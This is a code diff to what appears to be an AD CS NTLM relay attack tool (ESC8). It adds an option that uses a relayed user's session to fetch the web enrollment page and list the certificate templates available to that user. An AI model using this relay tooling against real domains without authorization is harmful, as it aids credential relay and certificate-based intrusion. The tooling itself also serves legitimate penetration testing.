@@ -207,6 +207,23 @@ class ADCSHTTPAttackClient(ProtocolAttack):
                 % repr(self.client.user)
             )
             return
+        
+        if self.adcs_relay.enum_templates:
+            from bs4 import BeautifulSoup
+            self.client.request("GET", "/certsrv/certrqxt.asp")
+            response = self.client.getresponse()
+            content = response.read()
+            soup = BeautifulSoup(content, 'html.parser')
+            select_tag = soup.find('select', {'name': 'lbCertTemplate', 'id':'lbCertTemplateID'})
+            if select_tag:
+                option_tags = select_tag.find_all('option')
+                print("Templates Found for %s:" % repr(self.client.user)) 
+                for option in option_tags:
+                    value = option['value']
+                    split_value = value.split(';')
+                    if len(split_value) > 1:
+                        print(split_value[1])
+            return self.finish_run()
 
         request_id = self.adcs_relay.request_id
         if request_id:
@@ -633,6 +650,7 @@ class Relay:
         forever=False,
         no_skip=False,
         timeout=5,
+        enum_templates=False,
         debug=False,
         **kwargs
     ):
@@ -651,6 +669,7 @@ class Relay:
         self.verbose = debug
         self.interface = interface
         self.port = port
+        self.enum_templates = enum_templates
         self.kwargs = kwargs
 
         self.attacked_targets = []
@@ -668,7 +687,11 @@ class Relay:
             if not self.target.endswith("/certsrv/certfnsh.asp"):
                 if not self.target.endswith("/"):
                     self.target += "/"
-                self.target += "certsrv/certfnsh.asp"
+
+                if self.enum_templates:
+                    self.target += "certsrv/certrqxt.asp"
+                else:                
+                    self.target += "certsrv/certfnsh.asp"
             logging.info("Targeting %s (ESC8)" % self.target)
 
         target = TargetsProcessor(
